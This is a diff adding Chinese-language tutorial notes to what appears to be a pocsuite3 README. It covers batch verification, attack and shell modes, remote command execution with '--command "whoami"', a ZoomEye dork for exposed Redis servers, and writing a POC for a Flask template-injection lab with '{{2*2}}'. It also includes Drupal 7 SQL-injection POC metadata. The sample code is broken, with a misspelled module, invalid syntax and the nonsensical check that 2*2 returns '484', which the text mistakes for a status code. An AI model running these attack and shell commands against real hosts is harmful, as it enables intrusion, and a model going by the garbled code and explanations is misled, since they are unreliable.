@@ -371,9 +371,146 @@ def _verify(self):
 [1]Verify验证模式；-r poc脚本路径；-u 目标地址;
 >>> python pocsuite.py -r pocs/test1.py -u https://www.xxx.com --verify
 [2]批量验证;-f 目标IP写到txt文本
->>> python pocsuite.py -r pocs/test1.py -f url.txt --verify
+>>> python pocsuite.py -r pocs/test1.py -u url.txt --verify
+[3]对所有poc目标进行测试
+>>> python pocsuite.py -r pocs/* -u https://www.xxx.com --verify
+[4]使用多线程
+>>> python pocsuite.py -r pocs/test1.py -u url.txt --verify --threads 10
+[5]使用Zoomeye搜索引擎，搜索开放端口为6379的Redis服务
+>>> python cli.py --dork 'port:6379' --vul-keyword 'redis' --max-page 2
+[6]Attack模式，向目标发起有效攻击
+>>> python pocsuite.py -r pocs/test1.py -u url.txt --attack
+[7]shell模式
+>>> python pocsuite.py -r pocs/test1.py -u url.txt --shell
+[8]使用自定义命令'comman‘，调用外部传递参数，进行半交互式命令执行
+>>> python pocsuite.py -r pocs/test1.py -u url.txt --attack --command "whoami"
 ```
 
 </details>
 
+
+<details>
+<summary>POC 脚本编写</summary>
+
+```
+1.Flask服务模版环境搭建
+Flask是python编写的轻量级Web应用框架，使用BSD授权
+WSGI工具箱采用Werkzeug,
+模版引擎规则使用Jinja2
+Flask属于微框架micro-framework
+
+通过wget或Github下载
+Docker-compose build //编译下载漏洞环境所需的配置
+Docker-compose up -d //启动漏洞环境
+安装之后访问 本机地址:8080
+
+漏洞服务代码
+~# docker ps
+~# docker exec -it 93s2 bash
+/ app# ls
+/ app# cat app.py
+<SNIP>
+name = request.args.get('name', 'guest') //name的值是直接从get参数中获取的，所以Template是完全可控的
+</SNIP>
+
+可在 本机地址:8000?name={{2*2}} 回车
+
+POC的命名形式： 组成漏洞应用名_版本号_漏洞类型名称 （只能小写、下划线、数字）
+```
+
+</details>
+
+<details>
+<summary>编写POC实现类DemoPOC,继承自POCBase类</summary>
+
+```
+from poscuite3.api import Output, POCBase, register_poc, requests, logger
+from poscuite3.api import get_listener_ip, get_listener_port
+from poscuite3.api import REVERSE_PAYLOAD
+from pocsuite3.lib utils import random_str
+
+    class DemoPOC(POCBase):
+```
+
+</details>
+
+<details>
+<summary>填写POC信息字段</summary>
+
+```
+vulID = '1571'       #ssvid ID ,如果是提交漏洞的同时提交PoC,则写成0
+version = '1'         #默认为1
+author = 'seebug'    #POC作者名字
+vulDate = '2014-10-16'  #漏洞公开的时间，不明确时可以写今天
+createDate = '2014-10-16' #编写POC的日期
+updateDate = '2014-10-16' #更新时间，默认和编写时间一样
+references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html'] #漏洞地址来源，0day不用写
+name = 'Drupal 7.x /includes/database/database.inc name_SQL_POC' #POC名称
+appPowerLink = 'https://www.drupal.org/' #漏洞厂商的主页地址
+appName = 'Drupal'  #漏洞应用名称
+appVersion = '7.x'  #漏洞影响版本
+vulType = 'SQL Injection'   #漏洞类型
+desc = '''
+Drupal 在处理IN语句时，展开数组时key带入SQL语句导致SQL注入，可以添加管理员，造成信息泄露
+    ‘’‘    #漏洞简要描述
+samples = []  #测试样列，使用POC测试成功的网站
+install_requires = []
+```
+
+</details>
+
+<details>
+<summary>编写验证模式，在_verify方法中写入POC验证脚本</summary>
+
+```
+def _verify(self):
+    output = Output(self)  #验证代码
+    if result:    #result 表示放回结果
+        output.success(result)
+    else:
+        output.fail('target is not vulnerable')
+    return output
+```
+
+</details>
+
+<details>
+<summary>编写攻击模式</summary>
+
+```
+//用_attack()函数中写入EXP利用脚本，在攻击模式下可以对目标进行getshell、查询管理员账户密码等操作，定义它的方法与检测模式类似
+def _attack(self):
+    output = Output(self)
+    result = {}
+    #攻击代码
+//如果该POC没有攻击模式，可以在_attack()函数下加入return self._verify(),无须再写_attack()函数
+
+//Poscuite框架 填写漏洞 IP地址进行url构造 ---> ‘/?name='
+//判断其返回状态及payload值，200:网页正常请求 484:服务器将url传入的payload正常执行，说明此处存在安全漏洞
+
+def _verify(self):
+    '''verity mode'''
+    result = {}
+    path = "/?name="
+    url = self.url + path
+    payload = "{{2*2}}"
+
+    #first req
+    try:
+        resq = requests.get(url + payload)
+        if resq and resq.status_code == 200 and "484" in resq.text:
+            result['VerityInfo'] = {}
+            result['VerityInfo']['URL'] = url
+            result['VerityInfo']['Name'] = payload
+        except Exception e:
+            pass
+        return self.parse_output(result)
+
+//将模版_verify方法替换Flask漏洞检测的脚本便完成了POC的编写
+//执行
+root@kali:~/pocsuite3-master# pocsuite -r test2.py -u http://127.0.0.1:8000 --verify
+```
+
+
+</details>
 ----------------------------------------------------------------------------
